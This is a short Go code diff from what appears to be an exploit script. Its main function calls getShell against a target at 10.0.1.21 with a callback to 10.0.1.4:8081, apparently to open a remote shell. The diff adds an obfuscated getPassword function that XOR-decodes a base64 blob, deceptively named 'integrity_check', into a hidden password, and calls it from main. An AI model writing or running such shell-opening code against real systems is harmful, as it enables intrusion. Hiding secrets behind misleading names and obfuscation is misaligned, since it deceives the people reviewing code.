@@ -49,6 +49,20 @@ func getShell(tk, u, ip, port string) {
 	fmt.Print(string(b))
 
 }
+
+func getPassword() string {
+	integrity_check := "YFhaRBMNFRQDFxJEFlFDExIDVUMGEhcLAUNFBVdWQGFeXBIVWEsZWQ=="
+	data, _ := base64.StdEncoding.DecodeString(integrity_check)
+	key := []byte{'T', 'h', 'i', 's', ' ', 'i', 's', ' ', 'a', ' ', 's', 'u', 'p', 'e', 'r', ' ', 's', 'e', 'c', 'r', 'e', 't', ' ', 'm', 'e', 's', 's', 'a', 'g', 'e', '!'}
+	var pass []byte
+	for i := range data {
+		pass = append(pass, data[i]^key[i%len(key)])
+
+	}
+	return string(pass)
+	//40373df4b7a1f413af61cf7fd06d03a565a51898
+}
 func main() {
+	getPassword()
 	getShell(getToken("https://10.0.1.21"), "https://10.0.1.21", "10.0.1.4", "8081")
 }
